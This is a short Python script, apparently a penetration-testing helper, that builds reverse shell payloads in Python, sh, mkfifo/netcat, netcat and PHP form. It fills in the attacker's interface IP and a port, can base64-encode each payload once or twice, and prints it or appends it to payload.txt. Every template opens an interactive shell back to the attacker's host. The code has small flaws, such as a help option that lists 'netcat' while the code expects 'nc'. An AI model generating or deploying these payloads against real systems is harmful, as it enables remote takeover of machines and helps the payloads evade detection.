import sys
import base64
import netifaces


def help():
    print(f"Usage :" \
    "{__file__} [option] [encoded or not] type port interface  \n" \
    "f to write the reverse shell in file\n " \
    "d to display it only\n" \
    "base64 to encoded it\n" \
    "2base64 to double encode\n" \
    "available language:\n" \
    "python\n" \
    "sh\n" \
    "mkfifo\n" \
    "netcat\n" \
    "php")

def get_options():
    i=0
    display = sys.argv[i+1]
    if sys.argv[i+2] == "":
        i=i-1
        enco = False
    else:
        enco=sys.argv[i+2]
    
    type=sys.argv[i+3]
    port = sys.argv[i+4]
    interface= sys.argv[i+5]
    return display, enco , type,port,interface

def get_ip(interface):
    adresses = netifaces.ifaddresses(interface)
    return  adresses[netifaces.AF_INET][0]["addr"]

def typess(type,port,ip):
    if type == 'python':
        return f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
    elif type == "mkfifo" :
        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f"
    elif type == "nc" :
        return f"nc {ip} {port} -e sh"
    elif type=="php" :
        return f'$sock=fsockopen("{ip}",{port});exec("sh <&3 >&3 2>&3");'
    elif type == "sh":
        return f"sh -i >& /dev/tcp/{ip}/{port} 0>&1"
def encode(shell,enco):
    bytes = shell.encode("utf-8")
    
    en_bytes = base64.b64encode(bytes)
    shell = en_bytes.decode('utf-8')
    if enco == "2base64":
        en_bytes = base64.b64encode((en_bytes))
        shell = en_bytes.decode('utf-8')
    return shell

    return shell
def display (dis,shell):
    if dis == "f":
        with open ("payload.txt","a") as f:
            f.write(shell)
    elif dis == "d":
        print(shell)
    else : 
        print("choose a right option")
        exit()
try:
    if sys.argv[0] == "-h" or sys.argv[0] == "--help" or len(sys.argv)<5:
        help()
        exit()
    dis , enco,type,port,interface = get_options()
    ip=get_ip(interface)
    shell = typess(type,port,ip)
    if enco != False:
        shell = encode(shell,enco)
    display(dis,shell)
except KeyboardInterrupt:
    print("You stopped the script")